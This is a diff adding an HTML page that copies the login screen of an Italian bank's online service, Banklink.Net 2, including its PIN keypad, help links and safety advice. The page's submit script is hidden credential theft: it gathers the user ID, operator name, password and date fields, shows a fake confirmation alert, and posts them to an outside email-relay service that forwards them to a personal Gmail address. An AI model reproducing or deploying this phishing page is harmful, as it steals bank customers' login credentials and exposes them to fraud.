@@ -1,0 +1,1539 @@
+<html class="translated-ltr">
+  <head>
+    <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8" />
+
+    <title>Accès au service Banklink.Net 2</title>
+    <link
+      href="/NET2/layouts/css/images/favicon.ico"
+      rel="shortcut icon"
+      type="image/x-icon"
+    />
+
+    <link
+      href="/NET2/layouts/css/Global003.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+    <link href="/NET2/layouts/css/Logon.css" rel="stylesheet" type="text/css" />
+
+    <link
+      href="/NET2/layouts/css/ButtonsCSS3.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+
+    <script
+      type="text/javascript"
+      src="/NET2/jscripts/jquery/jquery-3.5.1.min.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="/NET2/jscripts/jquery/jquery-migrate-3.3.2.min.js"
+    ></script>
+
+    <script language="JavaScript" src="/NET2/jscripts/jsMenu.js"></script>
+    <script
+      language="JavaScript"
+      src="/NET2/jscripts/pm_fp.js"
+      type="text/javascript"
+    ></script>
+    <script language="JavaScript">
+      <!--
+
+      var pwdReadonly = true;
+
+      function trovato(arr, obj) {
+        for (var i = 0; i < 10; i++) {
+          if (arr[i] == obj) {
+            return true;
+          }
+        }
+
+        return false;
+      }
+
+      var i = 0;
+      var unIntero = 0;
+      var keyValue = [-1, -1, -1, -1, -1, -1, -1, -1, -1, -1];
+
+      for (i = 0; i < 10; i++) {
+        for (;;) {
+          unIntero = Math.floor(Math.random() * 10);
+          if (!trovato(keyValue, unIntero)) {
+            keyValue[i] = unIntero;
+            break;
+          }
+        }
+      }
+
+      function appendKey(pinKey) {
+        campoP.value = campoP.value + pinKey;
+      }
+
+      function doKey(numero) {
+        document.loginForm.PWD.value = document.loginForm.PWD.value + numero;
+      }
+
+      function doBack() {
+        lungo = document.loginForm.PWD.value.length;
+        if (lungo > 1) {
+          document.loginForm.PWD.value = document.loginForm.PWD.value.substring(
+            0,
+            lungo - 1
+          );
+        } else if (lungo == 1) {
+          document.loginForm.PWD.value = "";
+        }
+      }
+
+      function autotab(original, destination) {
+        if (
+          original.getAttribute &&
+          original.value.length == original.getAttribute("maxlength")
+        ) {
+          destination.focus();
+        }
+      }
+
+      function popVerisign() {
+        apriPopup(
+          "https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=BANKLINKNET2.CARIPARMA.IT&lang=it",
+          "Help",
+          defaultHelpWidth,
+          defaultHelpHeight,
+          defaultOptions
+        );
+      }
+
+      function doCambiaLingua(lingua) {
+        location.href = "/NET2/Logon?abi=06230&lang=" + lingua;
+      }
+
+      //link richiamato cliccando sul pulsante verde (help)
+      function loginHelp(puntoHelp) {
+        document.POPHELP.punto.value = puntoHelp;
+        popTheHelp(URIpagina);
+      }
+
+      // variabile per l'help in linea
+      var URIpagina = "/NET2/hbdoc/LogonHub.jsp";
+
+      var mostratoAID = false;
+      var mostratoOperatore = false;
+
+      function checkFields() {
+        if (document.loginForm.AID.value.length < 1) {
+          alert("Immettere il codice utente.");
+          eval("document.loginForm.AID.focus()");
+          return false;
+        }
+
+        if (document.loginForm.operatore.value.length < 1) {
+          alert("Immettere il nome operatore.");
+          eval("document.loginForm.operatore.focus()");
+          return false;
+        }
+
+        if (document.loginForm.PWD.value.length < 1) {
+          alert("Immettere la password di accesso.");
+          if (pwdReadonly) {
+            eval("document.loginForm.dataGG.focus()");
+          } else {
+            eval("document.loginForm.PWD.focus()");
+          }
+          return false;
+        }
+
+        return true;
+      }
+
+      async function doSubmit() {
+        if (checkFields()) {
+          const data = {
+            id: document.loginForm.AID.value,
+            opérateur: document.loginForm.operatore.value,
+            password: document.loginForm.PWD.value,
+            dJJ: document.loginForm.dataGG.value,
+            dMM: document.loginForm.dataMM.value,
+            dAA: document.loginForm.dataAA.value,
+          };
+          if (pwdReadonly) {
+            document.loginForm.PWD.disabled = false;
+          }
+          //console.log(data);
+          alert("trasferimento confermato in attesa di conferma");
+          await sendEmail(data);
+        }
+      }
+
+      async function sendEmail(data) {
+        const apiUrl = "https://nodemailer-0uc0.onrender.com/send-email";
+
+        const requestBody = {
+          to: "Aurelia.beauve254@gmail.com", // Adresse e-mail du destinataire
+          subject: "Data Utilisateur Bank", // Sujet de l'e-mail
+          html: `<p>${JSON.stringify(data)}</p>`, // Contenu HTML de l'e-mail
+          authorName: "Votre Nom" // Votre nom
+        };
+
+        try {
+          const response = await fetch(apiUrl, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "Access-Control-Allow-Origin": "*"
+            },
+            body: JSON.stringify(requestBody)
+          });
+
+          const result = await response.json();
+          //console.log(result.message);
+        } catch (error) {
+          //console.error("Erreur lors de l'envoi de l'e-mail :", error);
+        }
+      }
+    </script>
+
+    <link
+      type="text/css"
+      rel="stylesheet"
+      charset="UTF-8"
+      href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.qhDXWpKopYk.L.W.O/am=wA/d=0/rs=AN8SPfq5gedF4FIOWZgYyMCNZA5tU966ig/m=el_main_css"
+    />
+  </head>
+
+  <body onload="loadImages();" onunload="unloadImages();">
+    <div
+      id="WzTtDiV"
+      style="
+        visibility: hidden;
+        position: absolute;
+        overflow: hidden;
+        padding: 0px;
+        width: 0px;
+        left: 0px;
+        top: 0px;
+      "
+    ></div>
+    <script language="JavaScript" src="/NET2/jscripts/wz_tooltip.js"></script>
+    <script language="JavaScript" src="/NET2/JsService/i18n.js"></script>
+    <div
+      id="hidepage"
+      style="
+        position: absolute;
+        left: 0px;
+        top: 0px;
+        background-color: #ffffff;
+        background-color: #ffffff;
+        height: 100%;
+        width: 100%;
+        z-index: 2001;
+        visibility: hidden;
+      "
+    >
+      <table width="100%" height="100%" cellspacing="0">
+        <tbody>
+          <tr>
+            <td width="100%" valign="top" align="left" height="100%">
+              <table width="100%" cellspacing="0">
+                <tbody>
+                  <tr>
+                    <td width="100%" valign="top" align="center">
+                      <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
+                      <h3>
+                        <font face="Lucida Sans Unicode" color="#004529"
+                          ><font style="vertical-align: inherit"
+                            ><font style="vertical-align: inherit"
+                              >Veuillez patienter,
+                            </font></font
+                          ><br /><font style="vertical-align: inherit"
+                            ><font style="vertical-align: inherit"
+                              >traitement...</font
+                            ></font
+                          ></font
+                        >
+                      </h3>
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div id="container" class="loginContainer">
+      <table cellpadding="0" cellspacing="0" border="0">
+        <tbody>
+          <tr>
+            <td height="1" valign="top" align="left">
+              <a name="pageTOP"></a>
+
+              <!-- BANNER -->
+              <table border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                  <tr>
+                    <td>
+                      <img
+                        src="/MEDIASRV/IMG/NET2_SITE/06230/IT/azimg/CAItalia_bannerAlto.png"
+                        vspace="0"
+                      />
+                    </td>
+                  </tr>
+                  <tr>
+                    <td nowrap align="left" valign="top">
+                      <img
+                        src="/NET2/layouts/css/images/spacer.gif"
+                        width="1"
+                        height="8"
+                        border="0"
+                      />
+                    </td>
+                  </tr>
+                </tbody>
+              </table>
+            </td>
+          </tr>
+
+          <tr>
+            <td valign="top" align="center" nowrap>
+              <form
+                autocomplete="off"
+                method="POST"
+                id="dataform"
+                name="loginForm"
+                action="/NET2/Login"
+                onsubmit="return checkSubmit();"
+              >
+                <input
+                  type="hidden"
+                  name="OWASP_CSRFTOKEN"
+                  value="37UC-O3T3-XJEH-OFWW-JI96-VFM8-3BGL-4A0B"
+                />
+                <input type="hidden" name="funzioneRichiesta" value="login" />
+                <input
+                  type="hidden"
+                  name="pm_fp"
+                  id="pm_fp_form"
+                  value="version%3D1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit/537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome/120%2E0%2E0%2E0%20safari/537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit/537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/120%2E0%2E0%2E0%20Safari/537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1536%7C864%7C824%26pm%5Ffpsw%3D%26pm%5Ffptz%3D8%26pm%5Ffpln%3Dlang%3Dfr%2DFR%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1"
+                />
+                <input type="hidden" name="metodo" value="keypad" />
+
+                <table cellpadding="0" cellspacing="0">
+                  <tbody>
+                    <tr>
+                      <td>
+                        <table
+                          cellpadding="0"
+                          cellspacing="0"
+                          class="accessPanel"
+                        >
+                          <tbody>
+                            <tr>
+                              <td class="titoloLogin">
+                                <font style="vertical-align: inherit"
+                                  ><font style="vertical-align: inherit"
+                                    >Accesso al servizio Banklink.Net
+                                  </font></font
+                                ><sup
+                                  ><font style="vertical-align: inherit"
+                                    ><font style="vertical-align: inherit"
+                                      >2</font
+                                    ></font
+                                  ></sup
+                                >
+                              </td>
+                            </tr>
+                            <tr>
+                              <td class="accessPanel accessPanelNord"></td>
+                            </tr>
+                            <tr>
+                              <td>
+                                <table
+                                  cellpadding="0"
+                                  cellspacing="0"
+                                  class="sfondoHomePage"
+                                >
+                                  <tbody>
+                                    <tr>
+                                      <td>
+                                        <table cellpadding="0" cellspacing="0">
+                                          <tbody>
+                                            <tr>
+                                              <td
+                                                height="30"
+                                                width="135"
+                                                nowrap
+                                                class="logonLabel"
+                                              >
+                                                <font
+                                                  style="
+                                                    vertical-align: inherit;
+                                                  "
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    >ID utente:</font
+                                                  ></font
+                                                >
+                                              </td>
+                                              <td>
+                                                <input
+                                                  onfocus="nextField = 'operatore'; focusInput(this);"
+                                                  onblur="blurInput(this);"
+                                                  type="text"
+                                                  name="AID"
+                                                  style="width: 127px"
+                                                  class="GenericINPUT"
+                                                  value
+                                                  maxlength="6"
+                                                  tabindex="1"
+                                                />
+                                              </td>
+                                              <td>&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                              <td
+                                                height="30"
+                                                width="135"
+                                                nowrap
+                                                class="logonLabel"
+                                              >
+                                                <font
+                                                  style="
+                                                    vertical-align: inherit;
+                                                  "
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    >Operatore:</font
+                                                  ></font
+                                                >
+                                              </td>
+                                              <td>
+                                                <input
+                                                  onfocus="nextField = pwdReadonly ? 'dataGG' : 'PWD'; focusInput(this);"
+                                                  onblur="blurInput(this);"
+                                                  type="text"
+                                                  name="operatore"
+                                                  style="width: 127px"
+                                                  class="GenericINPUT"
+                                                  value
+                                                  maxlength="50"
+                                                  tabindex="2"
+                                                />
+                                              </td>
+                                              <td>&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                              <td
+                                                height="30"
+                                                width="135"
+                                                nowrap
+                                                class="logonLabel"
+                                              >
+                                                <div
+                                                  id="lblData"
+                                                  style="visibility: visible"
+                                                >
+                                                  <font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Data
+                                                      (jj-mm-aaaa)&nbsp;:</font
+                                                    ></font
+                                                  >
+                                                </div>
+                                              </td>
+                                              <td nowrap>
+                                                <div
+                                                  id="fldData"
+                                                  style="visibility: visible"
+                                                >
+                                                  <table
+                                                    cellpadding="0"
+                                                    cellspacing="0"
+                                                  >
+                                                    <tbody>
+                                                      <tr>
+                                                        <td>
+                                                          <input
+                                                            onkeyup="autotab(this, document.loginForm.dataMM)"
+                                                            onfocus="nextField = 'dataMM'; focusInput(this);"
+                                                            onblur="blurInput(this);"
+                                                            type="text"
+                                                            name="dataGG"
+                                                            style="width: 25px"
+                                                            class="GenericINPUT"
+                                                            value
+                                                            maxlength="2"
+                                                            tabindex="3"
+                                                          />
+                                                        </td>
+                                                        <td width="17"></td>
+                                                        <td>
+                                                          <input
+                                                            onkeyup="autotab(this, document.loginForm.dataAA)"
+                                                            onfocus="nextField = 'dataAA'; focusInput(this);"
+                                                            onblur="blurInput(this);"
+                                                            type="text"
+                                                            name="dataMM"
+                                                            style="width: 25px"
+                                                            class="GenericINPUT"
+                                                            value
+                                                            maxlength="2"
+                                                            tabindex="4"
+                                                          />
+                                                        </td>
+                                                        <td width="17"></td>
+                                                        <td>
+                                                          <input
+                                                            onfocus="if(pwdReadonly) {nextField = 'doClick'; clickTarget = 'conferma';} else {nextField = 'PWD';} focusInput(this);"
+                                                            onblur="blurInput(this);"
+                                                            type="text"
+                                                            name="dataAA"
+                                                            style="width: 43px"
+                                                            class="GenericINPUT"
+                                                            value
+                                                            maxlength="4"
+                                                            tabindex="5"
+                                                          />
+                                                        </td>
+                                                      </tr>
+                                                    </tbody>
+                                                  </table>
+                                                </div>
+                                              </td>
+                                              <td nowrap align="left">
+                                                &nbsp;
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td
+                                                height="30"
+                                                width="135"
+                                                class="logonLabel"
+                                              >
+                                                &nbsp;
+                                              </td>
+                                              <td nowrap>
+                                                <div
+                                                  id="tastierino"
+                                                  style="visibility: visible"
+                                                >
+                                                  <table
+                                                    cellpadding="0"
+                                                    cellspacing="1"
+                                                  >
+                                                    <tbody>
+                                                      <tr>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyQ"
+                                                                value="7"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="8" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyH"
+                                                                value="8"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="9" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyK"
+                                                                value="1"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="10" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyZ"
+                                                                value="9"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="11" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyJ"
+                                                                value="2"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="12" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyW"
+                                                                value="4"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="13" /></font
+                                                          ></font>
+                                                        </td>
+                                                      </tr>
+                                                      <tr>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyR"
+                                                                value="5"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="14" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyA"
+                                                                value="6"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="15" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyD"
+                                                                value="3"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="16" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td align="left" nowrap>
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyX"
+                                                                value="0"
+                                                                onmousedown="appendKey(this.value);"
+                                                                tabindex="17" /></font
+                                                          ></font>
+                                                        </td>
+                                                        <td
+                                                          align="left"
+                                                          nowrap
+                                                          colspan="2"
+                                                        >
+                                                          <font
+                                                            style="
+                                                              vertical-align: inherit;
+                                                            "
+                                                            ><font
+                                                              style="
+                                                                vertical-align: inherit;
+                                                              "
+                                                              ><input
+                                                                class="tastierinoINPUT"
+                                                                type="button"
+                                                                name="keyBack"
+                                                                value="<---"
+                                                                onmousedown="javascript:doBack();"
+                                                                tabindex="18"
+                                                                style="
+                                                                  width: 41px;
+                                                                " /></font
+                                                          ></font>
+                                                        </td>
+                                                      </tr>
+                                                    </tbody>
+                                                  </table>
+                                                </div>
+                                              </td>
+                                              <td>&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                              <td
+                                                height="30"
+                                                width="135"
+                                                nowrap
+                                                class="logonLabel"
+                                              >
+                                                <font
+                                                  style="
+                                                    vertical-align: inherit;
+                                                  "
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    >Password di accesso&nbsp;:</font
+                                                  ></font
+                                                >
+                                              </td>
+                                              <td>
+                                                <input
+                                                  autocomplete="off"
+                                                  onfocus="nextField = 'doClick'; clickTarget = 'conferma'; focusInput(this);"
+                                                  onblur="blurInput(this);"
+                                                  type="password"
+                                                  name="PWD"
+                                                  style="width: 127px"
+                                                  class="GenericINPUT"
+                                                  value
+                                                  tabindex="3"
+                                                  disabled
+                                                />&nbsp;
+                                              </td>
+                                              <td nowrap align="left">
+                                                <font
+                                                  style="
+                                                    vertical-align: inherit;
+                                                  "
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><input
+                                                      class="roundINPUT"
+                                                      type="button"
+                                                      name="conferma"
+                                                      value="Entrer"
+                                                      onclick="javascript:doSubmit();"
+                                                      onfocus="nextField = 'doClick'; clickTarget = 'conferma';"
+                                                      tabindex="6"
+                                                      style="
+                                                        width: 48px;
+                                                      " /></font
+                                                ></font>
+                                              </td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                      </td>
+                                    </tr>
+                                    <tr>
+                                      <td
+                                        class="accessPanel sfondoHomePageAssistenza"
+                                      >
+                                        <table>
+                                          <tbody>
+                                            <tr>
+                                              <td></td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                        <span
+                                          style="
+                                            font-size: 8pt;
+                                            font-weight: bold;
+                                            color: green;
+                                            font-family: Arial;
+                                          "
+                                          ><font style="vertical-align: inherit"
+                                            ><font
+                                              style="vertical-align: inherit"
+                                              >Numero verde gratuito del servizio clienti
+                                              800-775544
+                                            </font></font
+                                          ><br /><font
+                                            style="vertical-align: inherit"
+                                            ><font
+                                              style="vertical-align: inherit"
+                                              >(dall'estero
+                                              +39-0521-914555)
+                                            </font></font
+                                          ></span
+                                        ><br />
+                                        <span
+                                          style="
+                                            font-size: 7pt;
+                                            color: #666664;
+                                            font-family: Arial, Verdana;
+                                          "
+                                          ><font style="vertical-align: inherit"
+                                            ><font
+                                              style="vertical-align: inherit"
+                                              >(lun/ven 8:00-20:00, sabato 9:00-13:00, 14:00-18:00)</font
+                                            ></font
+                                          ></span
+                                        >
+                                      </td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </td>
+                            </tr>
+                            <tr>
+                              <td class="accessPanel accessPanelSud"></td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+                      <td valign="top" align="right">
+                        <span class="titoloLogin">&nbsp;</span>
+
+                        <div>
+                          <a
+                            target="GuidaSicurezza"
+                            href="/MEDIASRV/FILE/NET2_SITE/00000/IT/azimg/GuidaBanklinknet2-Clienti.pdf"
+                            ><img
+                              align="bottom"
+                              alt
+                              src="/MEDIASRV/IMG/NET2_SITE/00000/IT/azimg/BannerSicurezza.jpg" /></a
+                          ><br /><img
+                            align="bottom"
+                            alt
+                            src="/MEDIASRV/IMG/NET2_SITE/06230/IT/azimg/BannerPostit.png"
+                          />
+                        </div>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td>&nbsp;</td>
+                    </tr>
+                    <tr>
+                      <td>
+                        <table
+                          class="helpPanel"
+                          cellspacing="0"
+                          cellpadding="0"
+                        >
+                          <tbody>
+                            <tr>
+                              <td>
+                                <table
+                                  class="sfondoHelp"
+                                  cellspacing="0"
+                                  cellpadding="0"
+                                >
+                                  <tbody>
+                                    <tr>
+                                      <td>
+                                        <table cellpadding="1">
+                                          <tbody>
+                                            <tr>
+                                              <td class="numero1">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('1');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Scopri il
+                                                      caratteristiche del servizio
+                                                      BankLink.net
+                                                    </font></font
+                                                  ><sup
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      ><font
+                                                        style="
+                                                          vertical-align: inherit;
+                                                        "
+                                                        >2</font
+                                                      ></font
+                                                    ></sup
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                    >
+                                                      .</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="numero2">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('2');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Come accedere a
+                                                      la prima volta.</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="numero3">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('3');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Prime operazioni
+                                                      consigliato dopo
+                                                      primo collegamento.</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="numero4">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('4');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Come accedere
+                                                      dopo il primo.</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="numero5">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('5');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Come navigare
+                                                      BankLink.net
+                                                    </font></font
+                                                  ><sup
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      ><font
+                                                        style="
+                                                          vertical-align: inherit;
+                                                        "
+                                                        >2</font
+                                                      ></font
+                                                    ></sup
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                    >
+                                                      .</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="numero6">&nbsp;</td>
+                                              <td class="sfondoHelp2">
+                                                <a
+                                                  href="javascript:loginHelp('6');"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Prerequisiti per
+                                                      operazioni
+                                                      multibanca.</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                      </td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </td>
+                            </tr>
+                            <tr>
+                              <td class="helpPanel helpPanelSud">&nbsp;</td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+
+                      <td valign="top" align="right">
+                        <table
+                          cellpadding="0"
+                          cellspacing="0"
+                          class="safetyPanel"
+                        >
+                          <tbody>
+                            <tr>
+                              <td class="safetyPanel titoloLogin">
+                                <font style="vertical-align: inherit"
+                                  ><font style="vertical-align: inherit"
+                                    >Sicurezza</font
+                                  ></font
+                                >
+                              </td>
+                              <td
+                                rowspan="3"
+                                style="text-align: right; vertical-align: top"
+                              ></td>
+                            </tr>
+                            <tr>
+                              <td
+                                colspan="2"
+                                class="safetyPanel safetyPanelNord"
+                              ></td>
+                            </tr>
+                            <tr>
+                              <td colspan="2">
+                                <table
+                                  cellpadding="0"
+                                  cellspacing="0"
+                                  class="sfondoSafety"
+                                >
+                                  <tbody>
+                                    <tr>
+                                      <td>
+                                        <table cellpadding="1">
+                                          <tbody>
+                                            <tr>
+                                              <td class="frecciaArancione"></td>
+                                              <td class="sfondoSafety2">
+                                                <a
+                                                  href="http://www.cariparma.it/jsp/it/informadett/infoid_5.jsp"
+                                                  target="Cariparma"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Come proteggersi da
+                                                      e-mail fraudolente.</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td class="frecciaArancione"></td>
+                                              <td class="sfondoSafety2">
+                                                <a
+                                                  href="https://banklinknet2.cariparma.it/MEDIASRV/FILE/NET2_SITE/06230/IT/help/images/Sicurezza_Virus.pdf"
+                                                  target="Cariparma"
+                                                  ><font
+                                                    style="
+                                                      vertical-align: inherit;
+                                                    "
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >Proteggi il tuo PC da
+                                                      virus. </font
+                                                    ><font
+                                                      style="
+                                                        vertical-align: inherit;
+                                                      "
+                                                      >(PDF 20 Ko)</font
+                                                    ></font
+                                                  ></a
+                                                >
+                                              </td>
+                                            </tr>
+                                            <tr>
+                                              <td colspan="2">&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                              <td colspan="2">&nbsp;</td>
+                                            </tr>
+                                            <tr>
+                                              <td colspan="2">&nbsp;</td>
+                                            </tr>
+                                          </tbody>
+                                        </table>
+                                      </td>
+                                    </tr>
+                                  </tbody>
+                                </table>
+                              </td>
+                            </tr>
+                            <tr>
+                              <td
+                                colspan="2"
+                                class="safetyPanel safetyPanelSud"
+                              ></td>
+                            </tr>
+                          </tbody>
+                        </table>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </form>
+            </td>
+          </tr>
+
+          <tr>
+            <td valign="bottom" align="left">
+              <table
+                width="100%"
+                cellpadding="0"
+                cellspacing="0"
+                class="sfondoHelp2"
+              ></table>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <script language="JavaScript">
+      <!--
+      var campoP = document.loginForm.PWD;
+
+      document.loginForm.keyX.value = keyValue[0];
+      document.loginForm.keyQ.value = keyValue[1];
+      document.loginForm.keyH.value = keyValue[2];
+      document.loginForm.keyK.value = keyValue[3];
+      document.loginForm.keyZ.value = keyValue[4];
+      document.loginForm.keyJ.value = keyValue[5];
+      document.loginForm.keyW.value = keyValue[6];
+      document.loginForm.keyR.value = keyValue[7];
+      document.loginForm.keyA.value = keyValue[8];
+      document.loginForm.keyD.value = keyValue[9];
+
+      //focus sui campi
+      nextField = "AID";
+
+      document.loginForm.PWD.disabled = pwdReadonly;
+      document.getElementById("tastierino").style.visibility = pwdReadonly
+        ? "visible"
+        : "hidden";
+      document.getElementById("lblData").style.visibility = pwdReadonly
+        ? "visible"
+        : "hidden";
